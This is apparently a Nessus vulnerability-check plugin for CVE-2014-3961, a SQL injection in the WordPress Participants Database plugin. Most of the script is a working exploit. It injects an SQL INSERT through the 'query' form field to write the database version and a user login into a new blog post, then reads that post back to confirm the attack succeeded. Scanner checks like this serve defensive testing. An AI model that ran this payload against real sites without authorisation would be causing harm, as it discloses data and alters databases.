#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76072);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/12/12 19:19:06 $");

  script_cve_id("CVE-2014-3961");
  script_bugtraq_id(67769);
  script_osvdb_id(107626);
  script_xref(name:"EDB-ID", value:"33613");

  script_name(english:"Participants Database Plugin for WordPress 'query' Parameter SQL Injection");
  script_summary(english:"Attempts to execute a SQL query.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Participants Database Plugin for WordPress installed on the remote
host is affected by a SQL injection vulnerability due to a failure to
properly sanitize user-supplied input to the 'query' parameter in the
pdb-signup script. An unauthenticated, remote attacker can exploit
this issue to inject or manipulate SQL queries in the back-end
database, resulting in the manipulation or disclosure of arbitrary
data.

Note that the application is also reportedly affected by an
unspecified flaw in which insufficient privilege checks allow an
unauthenticated user to execute actions reserved for administrative
users when shortcodes are used; however, Nessus has not tested this
issue.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Jun/0");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/participants-database/changelog");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Participants Database Plugin version 1.5.4.9 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/06/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/05/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:xnau:participants_databas3");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "wordpress_participants_database_1_5_4_9_sqli.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Participants Database";

# Check KB first
get_kb_item_or_exit("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

url_path = install['Redirect'];
if (!isnull(url_path)) url = url_path;
else url = dir + "/";

token = SCRIPT_NAME - ".nasl" + "-" + unixtime();
id = rand() % 10000 + rand();

query = "INSERT INTO wp_posts (ID, post_title, post_content) SELECT '" +
  id + "', '" + token + "', CONCAT('MySQL Version : ', @@version, '" +
  "\nWordPress User : ', user_login, '\nCurrent Database : ', database())" +
  "from wp_users LIMIT 1;";

query = urlencode(
  str        : query,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
               "56789=()_-;@:,"
);

boundary1 = '---------------------------XXXXXXXXXXXXX';
boundary  = '-----------------------------XXXXXXXXXXXXX';

postdata =
  boundary + '\n' +
  'Content-Disposition: form-data; name="action"\n\n' +
  'output CSV\n' +
  boundary + '\n' +
  'Content-Disposition: form-data; name="CSV_type"\n\n' +
  'participant list\n' +
  boundary + '\n' +
  'Content-Disposition: form-data; name="subsource"\n\n' +
  'participants-database\n' +
  boundary + '\n' +
  'Content-Disposition: form-data; name="query"\n\n' +
  query + '\n' +
  boundary + '--\n';

# Attempt exploit
res = http_send_recv3(
  method    : "POST",
  item      : url,
  data      : postdata,
  add_headers : make_array("Content-Type", "multipart/form-data; boundary=" +
  boundary1),
  port         : port,
  exit_on_fail : TRUE
);

attack_req = http_last_sent_request();

# Verify our attack worked
url2 = "?page_id=" + id;
res2 = http_send_recv3(
  method : "GET",
  item   : url + url2,
  port   : port,
  follow_redirect : TRUE,  # In case permalinks are used
  exit_on_fail : TRUE
);

if (
  "MySQL Version" >< res2[2] &&
  "WordPress User : " >< res2[2] &&
  token >< res2[2]
)
{
  output = strstr(res2[2], "MySQL Version");
  if (empty_or_null(output)) output = res[2];

  extra = 'Note that Nessus has not removed the blog post created by the POST'+
    '\n' + 'request above; it will need to be manually removed.\n';

  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key,
    line_limit : 5,
    request    : make_list(attack_req, build_url(qs:url+url2, port:port)),
    output     : output
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
